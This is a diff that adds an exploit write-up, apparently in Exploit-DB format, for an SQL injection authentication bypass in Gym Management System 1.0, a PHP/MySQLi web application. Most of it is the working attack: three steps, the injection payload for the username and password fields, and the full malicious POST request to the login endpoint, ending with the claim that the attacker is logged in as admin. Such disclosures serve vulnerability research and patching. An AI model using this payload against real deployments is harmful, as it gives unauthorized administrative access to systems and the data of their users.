@@ -1,0 +1,31 @@
+# Exploit Title: Gym Management System 1.0 - Authentication Bypass
+# Date: 21/10/2020
+# Exploit Author: Jyotsna Adhana
+# Vendor Homepage: https://www.sourcecodester.com/php/14541/gym-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14541&title=Gym+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+Step 1: Open the URL http://localhost/gym/gym/login.php
+
+Step 2: use payload jyot' or 1=1# in Username and Password field
+
+Malicious Request
+
+POST /gym/gym/ajax.php?action=login HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 55
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/gym/gym/login.php
+Cookie: PHPSESSID=7lojvad06l803amt3f7hp7o8re; laravel_session=eyJpdiI6IlBXakg2NzB1cVBEWVZtemIwVzZ6NVE9PSIsInZhbHVlIjoiU2dsaTN1alRCXC9cL1I5dnNzRDlPRDlXTDZ4UUFiakhlN0JLVzB4MnpOVVZibnpISDNFS1k3YjdzWWM2UWRzVEZyIiwibWFjIjoiZGRmODE1NGFhN2JhY2U2NTNhOWU1MzViMjFjYWExM2UzNzYwN2QzZDZmNDQwNjcyMjA1MjJiYTI2NDU2Y2Q1MSJ9; XSRF-TOKEN=eyJpdiI6IlBSMFVNT3NoYkNNVTRpQzNDRHNDNXc9PSIsInZhbHVlIjoiSmF2WXRabHhCZHNZdVlmd1RGeU1pakdoT2JQaWdvcFgzK1QzeFJ6YzRiVGZ5VGdMcmp6SlMrbVl4cnZucG9OZSIsIm1hYyI6Ijc2NzA5MjYzM2E2NjgwMWZlZmFlM2JlOTI2ZmI2YTA3NmE2M2FiYjdlN2E2NzI1NmVhZjA2N2FmOTgwOTlkZGUifQ%3D%3D
+
+username=jyot'+or+1%3D1+%23&password=jyot'+or+1%3D1+%23
+
+Step 3: You will be logged in as admin.
